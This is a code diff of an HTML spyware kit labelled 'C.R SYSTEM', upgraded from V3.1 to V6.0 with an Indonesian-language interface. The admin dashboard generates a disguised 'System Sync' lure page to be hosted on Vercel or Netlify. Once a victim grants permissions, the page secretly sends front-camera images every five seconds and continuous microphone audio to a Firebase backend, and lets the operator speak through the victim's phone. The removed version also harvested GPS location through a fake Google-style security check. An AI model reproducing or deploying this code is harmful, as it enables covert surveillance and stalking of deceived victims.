@@ -3,86 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R SYSTEM V3.1 - MONITORING CENTER</title>
+    <title>C.R SYSTEM V6.0 - TWO-WAY BRIDGE</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #020202; color: #00ff41; font-family: 'Courier New', monospace; }
-        .cr-card { background: #0a0a0a; border: 1px solid #143314; border-radius: 12px; }
-        .status-on { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
-        .status-off { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
-        .log-box::-webkit-scrollbar { width: 4px; }
-        .log-box::-webkit-scrollbar-thumb { background: #143314; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; }
+        .cr-card { background: #050505; border: 1px solid #1a1a1a; border-radius: 8px; }
+        .btn-ptt { background: #1a1a1a; border: 1px solid #333; transition: all 0.2s; }
+        .btn-ptt:active { background: #991b1b; border-color: #f87171; color: #fff; transform: scale(0.98); }
+        .glow-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.3); }
     </style>
 </head>
-<body class="p-4">
-    <div class="max-w-6xl mx-auto">
-        <!-- Navigation -->
-        <div class="flex gap-4 mb-6 border-b border-green-900 pb-2">
-            <button onclick="switchTab('admin')" id="btn-admin" class="text-xs font-bold border-b-2 border-green-500 pb-2">DASHBOARD ADMIN</button>
-            <button onclick="switchTab('target')" id="btn-target" class="text-xs font-bold text-gray-600 pb-2">PAYLOAD (UNTUK TARGET)</button>
+<body class="p-4 md:p-8">
+    <div class="max-w-5xl mx-auto space-y-6">
+        <!-- Tab Switcher -->
+        <div class="flex border-b border-zinc-800">
+            <button onclick="setTab('admin')" id="t-admin" class="px-6 py-2 text-[10px] font-bold border-b-2 border-green-500">ADMIN CONSOLE</button>
+            <button onclick="setTab('target')" id="t-target" class="px-6 py-2 text-[10px] font-bold text-zinc-600">PAYLOAD V6</button>
         </div>
 
-        <!-- ADMIN PANEL -->
-        <div id="panel-admin" class="space-y-6">
-            <div class="flex justify-between items-center">
-                <h1 class="text-xl font-black italic tracking-tighter">C.R V3.1 INTERCEPTOR</h1>
-                <div id="target-stat" class="text-[10px] font-bold status-off animate-pulse uppercase">Target Offline</div>
-            </div>
-
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <!-- Media Display -->
-                <div class="lg:col-span-2 space-y-4">
-                    <div class="cr-card aspect-video relative overflow-hidden flex items-center justify-center border-2 border-green-900/30">
-                        <img id="live-photo" class="w-full h-full object-cover hidden" src="">
-                        <div id="cam-loading" class="text-[10px] text-gray-700 uppercase tracking-widest">Menunggu Foto Candid...</div>
-                        <div class="absolute top-2 left-2 bg-black/80 px-2 py-1 text-[8px] border border-green-900">FRONT_CAM_LIVE</div>
+        <!-- ADMIN DASHBOARD -->
+        <div id="panel-admin" class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-2 space-y-4">
+                <!-- Visual Feed -->
+                <div class="cr-card aspect-video relative overflow-hidden flex items-center justify-center border-2 border-zinc-900">
+                    <img id="display-frame" class="w-full h-full object-cover hidden" src="">
+                    <div id="no-signal" class="text-center">
+                        <p class="text-[9px] uppercase tracking-widest text-zinc-700">Waiting for Camera Feed...</p>
                     </div>
-                    
-                    <div class="cr-card p-4 grid grid-cols-2 gap-4 text-[10px]">
-                        <div>
-                            <p class="text-gray-500 uppercase mb-1">Koordinat GPS</p>
-                            <p id="gps-val" class="text-blue-400 font-bold">Menunggu Sinyal...</p>
-                        </div>
-                        <div class="text-right">
-                            <p class="text-gray-500 uppercase mb-1">Aksi</p>
-                            <a id="gps-link" href="#" target="_blank" class="bg-blue-900/50 px-2 py-1 rounded text-blue-200 hidden">BUKA MAPS</a>
-                        </div>
-                    </div>
+                    <div class="absolute top-4 left-4 bg-red-600 px-2 py-0.5 rounded text-[8px] font-bold animate-pulse">REC</div>
                 </div>
 
-                <!-- Controls & Logs -->
-                <div class="space-y-4">
+                <!-- Info Grid -->
+                <div class="grid grid-cols-2 gap-4">
                     <div class="cr-card p-4">
-                        <h2 class="text-[10px] font-bold mb-4 text-green-700">AUDIO & VOICE CONTROL</h2>
-                        <div class="flex gap-2 mb-4">
-                            <button onclick="toggleAudio()" id="listen-btn" class="flex-1 bg-green-900/20 border border-green-900 py-3 rounded text-[10px] font-bold hover:bg-green-500 hover:text-black transition-all">DENGERIN MIC</button>
+                        <p class="text-[9px] text-zinc-500 uppercase mb-2">Target Audio</p>
+                        <div class="flex items-end gap-1 h-8" id="audio-viz">
+                            <div class="bg-green-500 w-full h-1"></div>
+                            <div class="bg-green-500 w-full h-1"></div>
+                            <div class="bg-green-500 w-full h-1"></div>
                         </div>
-                        <button onmousedown="micSpeak(true)" onmouseup="micSpeak(false)" ontouchstart="micSpeak(true)" ontouchend="micSpeak(false)" class="w-full bg-blue-900/20 border border-blue-500 py-6 rounded-xl text-[10px] font-black hover:bg-blue-500 hover:text-white transition-all uppercase">Tekan & Tahan untuk Bicara</button>
                     </div>
-
                     <div class="cr-card p-4">
-                        <h2 class="text-[10px] font-bold mb-2 text-gray-500">SYSTEM LOGS</h2>
-                        <div id="logs" class="h-40 overflow-y-auto log-box text-[9px] text-gray-600 font-mono space-y-1">
-                            <p>> System ready...</p>
-                        </div>
+                        <p class="text-[9px] text-zinc-500 uppercase">GPS Position</p>
+                        <p id="loc-text" class="text-[10px] font-bold">Offline</p>
                     </div>
                 </div>
             </div>
+
+            <!-- Admin Audio Controls -->
+            <div class="space-y-4">
+                <div class="cr-card p-5 space-y-6">
+                    <div>
+                        <h2 class="text-[10px] font-bold text-green-700 uppercase mb-4">1. Browser Sync</h2>
+                        <button onclick="enableAudio()" id="audio-init" class="w-full py-3 rounded bg-red-950/20 border border-red-900 text-red-500 text-[9px] font-bold uppercase hover:bg-red-600 hover:text-white">
+                            Aktifkan Suara Dashboard
+                        </button>
+                    </div>
+
+                    <div class="pt-4 border-t border-zinc-900">
+                        <h2 class="text-[10px] font-bold text-blue-700 uppercase mb-4">2. Talk to Target (Speaker)</h2>
+                        <button id="ptt-btn" class="w-full py-10 rounded-xl btn-ptt text-[10px] font-black uppercase glow-red">
+                            Tahan & Bicara ke Target
+                        </button>
+                        <p class="text-[8px] text-center text-zinc-600 mt-2">Suara lo bakal langsung bunyi di HP target.</p>
+                    </div>
+                </div>
+
+                <div class="cr-card p-4 h-40 overflow-y-auto font-mono text-[9px] text-zinc-600 space-y-1" id="log-box">
+                    <p>> [SYS] Bridge V6 Online.</p>
+                </div>
+            </div>
         </div>
 
-        <!-- TARGET PAYLOAD -->
-        <div id="panel-target" class="hidden space-y-4">
-            <div class="cr-card p-6">
-                <h2 class="text-sm font-bold mb-4 text-green-500">Umpan (Link Target)</h2>
-                <p class="text-[11px] text-gray-400 mb-4 font-mono">Salin kode di bawah, simpan sebagai 'index.html', upload ke Vercel/Netlify.</p>
-                <textarea id="payload-text" readonly class="w-full h-64 bg-black border border-green-900/30 p-4 text-[10px] text-green-700 outline-none font-mono"></textarea>
-                <button onclick="copyPayload()" class="mt-4 bg-green-900 px-4 py-2 text-[10px] rounded font-bold hover:bg-green-500 hover:text-black">SALIN KODE</button>
+        <!-- PAYLOAD PANEL -->
+        <div id="panel-target" class="hidden">
+            <div class="cr-card p-6 space-y-4">
+                <h2 class="text-sm font-bold text-green-500">Target Source (index.html)</h2>
+                <textarea id="payload-src" readonly class="w-full h-80 bg-black border border-zinc-800 p-4 text-[10px] text-green-800 outline-none font-mono"></textarea>
+                <button onclick="copyPayload()" class="bg-green-900 px-6 py-2 rounded text-[10px] font-bold">COPY CODE</button>
             </div>
         </div>
     </div>
-
-    <!-- AUDIO ELEMENT -->
-    <audio id="remote-audio" autoplay></audio>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
@@ -101,140 +102,153 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = "apktroj";
 
-        // Generate Payload
-        const payloadCode = `<!DOCTYPE html>
+        // PAYLOAD TEMPLATE V6
+        const rawPayload = `<!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title></head>
+<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>System Sync</title></head>
 <body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
-  <div style="text-align:center;padding:20px;width:90%;max-width:320px">
-    <div style="background:#1a73e8;width:60px;height:60px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:bold">G</div>
-    <h2 style="font-size:18px">Verifikasi Keamanan</h2>
-    <p style="font-size:12px;color:#aaa">Klik izinkan untuk mengamankan akun Anda dari akses tidak sah.</p>
-    <button id="auth" style="background:#1a73e8;color:white;border:none;width:100%;padding:15px;border-radius:8px;font-weight:bold;margin-top:20px;cursor:pointer">SAYA SETUJU</button>
-    <video id="v" style="display:none" autoplay playsinline muted></video>
+  <div style="text-align:center;padding:20px">
+    <div style="background:#4285f4;width:60px;height:60px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px">S</div>
+    <h2 style="font-size:18px">Sinkronisasi Audio</h2>
+    <p style="font-size:12px;color:#888">Klik izinkan untuk sinkronisasi perangkat.</p>
+    <button id="auth" style="background:#4285f4;color:#fff;border:none;width:100%;padding:16px;border-radius:8px;font-weight:bold;margin-top:20px">SINKRONKAN</button>
+    <video id="v" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
   </div>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
     import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
     
     const app = initializeApp(${JSON.stringify(firebaseConfig)});
     const db = getFirestore(app);
     const auth = getAuth(app);
-    
+    let aCtx;
+
     document.getElementById('auth').onclick = async () => {
       try {
         await signInAnonymously(auth);
+        aCtx = new (window.AudioContext || window.webkitAudioContext)();
         const s = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user"}});
-        document.getElementById('auth').innerText = "MENYINKRONKAN...";
+        document.getElementById('auth').innerText = "TERHUBUNG";
         document.getElementById('auth').disabled = true;
-        
-        // 1. AUTO PHOTO CANDID
-        const v = document.getElementById('v'); v.srcObject = s;
-        v.onloadedmetadata = () => {
-          setTimeout(async () => {
-             const c = document.getElementById('c');
-             c.width = v.videoWidth; c.height = v.videoHeight;
-             c.getContext('2d').drawImage(v, 0, 0);
-             const img = c.toDataURL('image/jpeg', 0.5);
-             await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { data: img, time: serverTimestamp() });
-          }, 2000);
-        };
 
-        // 2. AUTO LOCATION & STATUS
-        navigator.geolocation.getCurrentPosition(async (p) => {
-           await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { 
-             lat: p.coords.latitude, lng: p.coords.longitude, online: true, time: serverTimestamp() 
-           });
-        }, (err) => {
-           // Jika GPS ditolak, tetap kirim status online
-           setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { online: true, time: serverTimestamp() });
-        }, {enableHighAccuracy: true});
-      } catch(e) { alert("Error: Izin perangkat diperlukan untuk verifikasi."); }
+        const v = document.getElementById('v'); v.srcObject = s;
+        const c = document.getElementById('c'); const ctx = c.getContext('2d');
+
+        // Capture Video every 5s
+        setInterval(() => {
+          c.width = v.videoWidth; c.height = v.videoHeight;
+          ctx.drawImage(v, 0, 0);
+          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { data: c.toDataURL('image/jpeg', 0.4), time: Date.now() });
+        }, 5000);
+
+        // Listen for Admin's Voice (The "Suara ke Target" fix)
+        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'admin_voice'), (snap) => {
+          if(snap.exists() && aCtx) {
+            const d = snap.data();
+            fetch(d.chunk).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
+              const src = aCtx.createBufferSource();
+              src.buffer = buf; src.connect(aCtx.destination); src.start();
+            });
+          }
+        });
+
+        // Send Target's Voice to Admin
+        const mr = new MediaRecorder(s);
+        mr.ondataavailable = (e) => {
+          const r = new FileReader();
+          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'target_voice'), { chunk: r.result, time: Date.now() });
+          r.readAsDataURL(e.data);
+        };
+        mr.start(2000);
+      } catch(e) { alert("Error: Izin ditolak."); }
     };
   </scr` + `ipt>
 </body>
 </html>`;
 
-        document.getElementById('payload-text').value = payloadCode;
+        document.getElementById('payload-src').value = rawPayload;
 
-        // ADMIN LOGIC
-        async function boot() {
+        // ADMIN CORE
+        let aCtx, adminRecorder;
+        
+        window.enableAudio = () => {
+            aCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const btn = document.getElementById('audio-init');
+            btn.innerText = "DASHBOARD AUDIO READY";
+            btn.className = "w-full py-3 rounded bg-green-900/40 border border-green-500 text-green-400 text-[9px] font-bold uppercase";
+            addLog("Audio Context Unlocked.");
+        };
+
+        // ADMIN VOICE RECORDING (Talk to Target)
+        async function setupAdminMic() {
             try {
-                await signInAnonymously(auth);
-                addLog("Authenticating system...");
-                listenTarget();
-            } catch(e) { addLog("Error: " + e.message); }
+                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                adminRecorder = new MediaRecorder(s);
+                adminRecorder.ondataavailable = (e) => {
+                    const r = new FileReader();
+                    r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'admin_voice'), { chunk: r.result, time: Date.now() });
+                    r.readAsDataURL(e.data);
+                };
+            } catch(e) { addLog("Mic Admin Gagal: " + e.message); }
         }
 
-        function listenTarget() {
-            // Watch Status & Location
-            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'control', 'status'), (snap) => {
-                if(snap.exists()) {
-                    const d = snap.data();
-                    const st = document.getElementById('target-stat');
-                    st.innerText = "Target Online";
-                    st.className = "text-[10px] font-bold status-on animate-pulse uppercase";
-                    
-                    // FIX: Check if lat/lng exist before using toFixed
-                    if (d.lat !== undefined && d.lng !== undefined) {
-                        document.getElementById('gps-val').innerText = `${d.lat.toFixed(6)}, ${d.lng.toFixed(6)}`;
-                        const gl = document.getElementById('gps-link');
-                        gl.href = `https://www.google.com/maps?q=${d.lat},${d.lng}`;
-                        gl.classList.remove('hidden');
-                        addLog("Target location updated.");
-                    } else {
-                        document.getElementById('gps-val').innerText = "Online (GPS Pending)";
-                        addLog("Target online but GPS position not yet acquired.");
-                    }
-                }
-            });
+        const pttBtn = document.getElementById('ptt-btn');
+        pttBtn.onmousedown = () => { if(adminRecorder) { adminRecorder.start(); addLog("Transmitting to target..."); } };
+        pttBtn.onmouseup = () => { if(adminRecorder && adminRecorder.state === "recording") { adminRecorder.stop(); addLog("Transmission ended."); } };
 
-            // Watch Photo
-            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'control', 'photo'), (snap) => {
+        async function init() {
+            await signInAnonymously(auth);
+            setupAdminMic();
+            startMonitoring();
+        }
+
+        function startMonitoring() {
+            // Target Visual
+            onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), (snap) => {
                 if(snap.exists()) {
-                    const d = snap.data();
-                    const img = document.getElementById('live-photo');
-                    img.src = d.data;
+                    const img = document.getElementById('display-frame');
+                    img.src = snap.data().data;
                     img.classList.remove('hidden');
-                    document.getElementById('cam-loading').classList.add('hidden');
-                    addLog("New candid photo received.");
+                    document.getElementById('no-signal').classList.add('hidden');
+                }
+            });
+
+            // Target Audio (Listen to them)
+            onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'target_voice'), (snap) => {
+                if(snap.exists() && aCtx) {
+                    playChunk(snap.data().chunk);
                 }
             });
         }
 
-        window.toggleAudio = async () => {
-            addLog("Menghubungkan ke mikrofon remote...");
-        };
+        function playChunk(url) {
+            fetch(url).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
+                const s = aCtx.createBufferSource();
+                s.buffer = buf; s.connect(aCtx.destination); s.start();
+            });
+        }
 
-        window.micSpeak = (val) => {
-            addLog(val ? "PTT: Bicara sekarang..." : "PTT: Jalur suara ditutup.");
-        };
-
-        window.switchTab = (t) => {
+        window.setTab = (t) => {
             document.getElementById('panel-admin').classList.toggle('hidden', t !== 'admin');
             document.getElementById('panel-target').classList.toggle('hidden', t !== 'target');
-            document.getElementById('btn-admin').className = t === 'admin' ? 'text-xs font-bold border-b-2 border-green-500 pb-2' : 'text-xs font-bold text-gray-600 pb-2';
-            document.getElementById('btn-target').className = t === 'target' ? 'text-xs font-bold border-b-2 border-green-500 pb-2' : 'text-xs font-bold text-gray-600 pb-2';
         };
 
         window.copyPayload = () => {
-            const t = document.getElementById('payload-text');
-            t.select();
+            document.getElementById('payload-src').select();
             document.execCommand('copy');
-            addLog("Payload copied.");
+            addLog("V6 Payload Copied.");
         };
 
         function addLog(m) {
-            const l = document.getElementById('logs');
-            l.innerHTML += `<p>> [${new Date().toLocaleTimeString()}] ${m}</p>`;
-            l.scrollTop = l.scrollHeight;
+            const b = document.getElementById('log-box');
+            b.innerHTML += `<p>> [${new Date().toLocaleTimeString()}] ${m}</p>`;
+            b.scrollTop = b.scrollHeight;
         }
 
-        boot();
+        init();
     </script>
 </body>
 </html>
